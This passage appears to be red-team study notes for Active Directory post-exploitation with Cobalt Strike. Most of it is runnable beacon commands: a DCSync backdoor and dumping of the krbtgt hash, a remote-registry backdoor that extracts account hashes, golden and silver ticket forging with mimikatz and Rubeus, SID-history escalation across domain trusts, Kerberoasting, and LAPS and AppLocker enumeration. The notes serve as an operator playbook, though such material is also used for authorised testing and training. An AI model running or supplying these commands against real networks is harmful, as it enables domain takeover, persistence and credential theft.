- [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
- [XCT MSSQL Notes](https://notes.vulndev.io/notes/redteam/payloads/windows/mssql)

## Full Control

### DCSync Backdoor

```
# grant user DCSync rights
beacon> Add-DomainObjectAcl -TargetIdentity 'DC=vault,DC=io' -PrincipalIdentity 'r.blurr' -Rights DCSync
[...]

beacon> dcsync krbtgt
[...]
```

### Remote Registry Backdoor

```
# as DA
beacon> powershell-import /tools/DAMP/Add-RemoteRegBackdoor.ps1
beacon> powershell Add-RemoteRegBackdoor -ComputerName dc01 -Trustee vault\s.larken

# NTLM of computer account
beacon> powershell Get-RemoteMachineAccountHash -ComputerName dc01

# NTLM of local account
beacon> powershell Get-RemoteLocalAccountHash -ComputerName dc01
```

#### Resources
- https://github.com/HarmJ0y/DAMP

### Golden Tickets

```
# create
beacon> mimikatz kerberos::golden /user:administrator /domain:vault.io /sid:S-1-5-21-3865823697-1816233505-1834004910 /krbtgt:ui23226a07bed6f9617e6eafe01apo87 /ticket:golden.kirbi

# imperonsate
beacon> execute-assembly /tools/Rubeus.exe ptt /ticket:golden.kirbi
[...]

# or
beacon> execute-assembly /tools/Rubeus.exe createnetonly /program:c:\windows\system32\cmd.exe
beacon> execute-assembly /tools/Rubeus.exe ptt /luid:0x24314fe /ticket:golden.kirbi
beacon> steal_token 6208
```

### Silver Ticket

```
beacon> mimikatz kerberos::golden /user:Administrator /domain:vault.io /sid:S-1-5-21-3865823697-1816233505-1834004910 /target:dc01.vault.io /service:cifs /rc4:REDACTED /ticket:silver.kirbi
```

#### Resources
- https://adsecurity.org/?p=2011

## Domain Trusts

Enumerate

```
beacon> powershell-import /tools/PowerSploit/Recon/PowerView.ps1
beacon> powerpick Get-DomainTrust -Domain child.vault.io
beacon> powerpick Get-DomainComputer -Domain child.vault.io | select DnsHostName
beacon> execute-assembly /tools/SharpHound.exe -c all -D child.vault.io
```

BloodHound

(analysis pre-build queries)
"Users with Foreign Domain Group Membership"

Kerberoast

```
beacon> execute-assembly c:\tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /domain:child.vault.io
```

Golden Ticket + SID History

```
# SIDS (new domain)
beacon> powershell-import /tools/PowerSploit/Recon/PowerView.ps1
beacon> powerpick Get-DomainGroup -Identity 'Domain Admins' -Domain parent.vault.io | select ObjectSid
[...]

# SID
beacon> powerpick ConvertTo-SID 'child\administrator'

# update, use /ptt instead of /ticket to skip storing file
beacon> mimikatz kerberos::golden /user:Administrator /domain:dev.vault.io /sid:S-1-5-21-2824171953-2587308990-2984250211 /sids:S-1-5-21-3063796876-3415205720-618848691-512 /krbtgt:1b1baa15534dbd2f6e9de344e6d17ffe /ticket:vl.kirbi

# download
beacon> download vlt.kirbi
beacon> kerberos_ticket_use /tmp/vlt.kirbi
```

## Local Administrator Password Solution (LAPS)

### Enumerate

BloodHound

```
# find computers with LAPS enabled
MATCH (c:Computer {haslaps: true}) RETURN c

# find groups that can read LAPS
MATCH p=(g:Group)-[:ReadLAPSPassword]->(c:Computer) RETURN p
```

CS

```
# use bloodhound to find registry.pol file for download
beacon> download \\vault.io\SysVol\vault.io\Policies\{FDC369C2-35C2-4D97-B455-BB7839854512}\Machine\Registry.pol
```

Creds

```
beacon> make_token vault.io\mssql_svc Passw0rd
[...]

# if laps tools are installed
beacon> powershell Get-Command *AdmPwd

# using PowerView
beacon> Get-DomainComputer
```

## AppLocker

Enumerate

```
beacon> execute-assembly /tools/SeatBelt.exe -group=system

# using MS modules, for local policies, use -Local 
beacon> Get-AppLockerPolicyInfo | ft -AutoSize
beacon> Get-AppLockerPolicyInfo -Local | ft -AutoSize
```

### Resources
- https://p0w3rsh3ll.wordpress.com/2020/05/15/how-to-view-an-applocker-policy-enforcement/
